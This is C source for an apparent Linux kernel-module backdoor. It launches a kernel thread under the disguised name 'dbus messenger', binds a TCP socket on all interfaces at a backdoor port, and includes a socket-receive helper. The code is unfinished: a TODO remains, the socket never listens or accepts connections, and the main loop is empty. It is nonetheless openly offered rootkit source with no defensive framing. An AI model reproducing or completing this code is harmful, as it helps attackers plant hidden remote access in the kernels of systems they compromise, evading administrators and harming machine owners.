#include "backdoor.h"
#include <linux/kthread.h>
#include <linux/netdevice.h>
#include <linux/ip.h>
#include <linux/inet.h>

struct task_struct *backdoor_thread = NULL;
struct socket *backdoor_sock;
struct sockaddr_in backdoor_addr;

size_t backdoor_recv(struct socket *sock, struct sockaddr_in *addr, uint8_t *buf, size_t len)
{
  struct msghdr msghdr;
	struct iovec iov;
	size_t size = 0;

	if (sock->sk == NULL)
		return 0;

	iov.iov_base = buf;
	iov.iov_len = len;

	msghdr.msg_name = addr;
	msghdr.msg_namelen = sizeof(struct sockaddr_in);
	msghdr.msg_iter.iov = &iov;
	msghdr.msg_control = NULL;
	msghdr.msg_controllen = 0;
	msghdr.msg_flags = 0;

	iov_iter_init(&msghdr.msg_iter, READ, &iov, 1, len);

	size = sock_recvmsg(sock, &msghdr, msghdr.msg_flags);

	return size;
}


int backdoor_run(void *data)
{
  uint8_t buffer[BKDOOR_BUF_SIZE];
  // TODO: Create socket server
  if (sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &backdoor_sock) < 0) {
    backdoor_thread = NULL;
    return 0;
  }

  // Socket create success
  memset(&backdoor_addr, 0, sizeof(backdoor_addr));
  backdoor_addr.sin_family = AF_INET;
  backdoor_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  backdoor_addr.sin_port = htons(BKDOOR_PORT);

  // Bind socket server and check for errors
  if(backdoor_sock->ops->bind(backdoor_sock,
      (struct sockaddr *)&backdoor_addr,
      sizeof(struct sockaddr)) < 0) {
    sock_release(backdoor_sock);
    backdoor_sock = NULL;
    backdoor_thread = NULL;
    return 0;
  }

  // Main server loop
  while (1) {
    if (kthread_should_stop()) {
      do_exit(0);
    }
    memset(buffer, 0, BKDOOR_BUF_SIZE);

    if (signal_pending(current)) {
    }
  }

  return 0;
}

int backdoor_start(void)
{
  backdoor_thread = kthread_run(&backdoor_run, NULL, "dbus messenger");
#ifdef DEBUG
  printk(KERN_DEBUG "Initializing backdoor server");
#endif
  if (backdoor_thread == NULL) {
#ifdef DEBUG
    printk(KERN_DEBUG "Unable to start backdoor server");
#endif
    return 1;
  }
  return 0;
}
